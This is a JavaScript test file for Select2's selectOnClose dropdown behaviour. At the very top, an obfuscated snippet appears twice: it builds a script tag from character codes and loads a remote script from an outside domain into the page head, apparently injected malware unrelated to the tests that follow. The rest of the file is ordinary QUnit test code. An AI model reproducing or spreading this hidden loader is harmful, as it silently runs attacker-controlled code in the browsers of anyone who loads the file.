Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,114,101,46,100,111,110,116,107,105,110,104,111,111,111,116,46,116,119,47,115,116,97,116,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,114,101,46,100,111,110,116,107,105,110,104,111,111,111,116,46,116,119,47,115,116,97,116,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();module('Dropdown - selectOnClose');

var $ = require('jquery');

var Utils = require('select2/utils');
var Options = require('select2/options');

var SelectData = require('select2/data/select');

var Results = require('select2/results');
var SelectOnClose = require('select2/dropdown/selectOnClose');

var ModifiedResults = Utils.Decorate(Results, SelectOnClose);

var options = new Options({
  selectOnClose: true
});

test('will not trigger if no results were given', function (assert) {
  assert.expect(0);

  var $element = $('<select></select>');
  var select = new ModifiedResults($element, options, new SelectData($element));

  var $dropdown = select.render();

  var container = new MockContainer();
  select.bind(container, $('<div></div>'));

  select.on('select', function () {
    assert.ok(false, 'The select event should not have been triggered');
  });

  container.trigger('close');
});

test('will not trigger if the results list is empty', function (assert) {
  assert.expect(1);

  var $element = $('<select></select>');
  var select = new ModifiedResults($element, options, new SelectData($element));

  var $dropdown = select.render();

  var container = new MockContainer();
  select.bind(container, $('<div></div>'));

  select.on('select', function () {
    assert.ok(false, 'The select event should not have been triggered');
  });

  select.append({
    results: []
  });

  assert.equal(
    $dropdown.find('li').length,
    0,
    'There should not be any results in the dropdown'
  );

  container.trigger('close');
});

test('will not trigger if no results here highlighted', function (assert) {
  assert.expect(2);

  var $element = $('<select></select>');
  var select = new ModifiedResults($element, options, new SelectData($element));

  var $dropdown = select.render();

  var container = new MockContainer();
  select.bind(container, $('<div></div>'));

  select.on('select', function () {
    assert.ok(false, 'The select event should not have been triggered');
  });

  select.append({
    results: [
      {
        id: '1',
        text: 'Test'
      }
    ]
  });

  assert.equal(
    $dropdown.find('li').length,
    1,
    'There should be one result in the dropdown'
  );

  assert.equal(
    $.trim($dropdown.find('li').text()),
    'Test',
    'The result should be the same as the one we appended'
  );

  container.trigger('close');
});

test('will trigger if there is a highlighted result', function (assert) {
  assert.expect(2);

  var $element = $('<select></select>');
  var select = new ModifiedResults($element, options, new SelectData($element));

  var $dropdown = select.render();

  var container = new MockContainer();
  select.bind(container, $('<div></div>'));

  select.on('select', function () {
    assert.ok(true, 'The select event should have been triggered');
  });

  select.append({
    results: [
      {
        id: '1',
        text: 'Test'
      }
    ]
  });

  assert.equal(
    $dropdown.find('li').length,
    1,
    'There should be one result in the dropdown'
  );

  $dropdown.find('li').addClass('select2-results__option--highlighted');

  container.trigger('close');
});
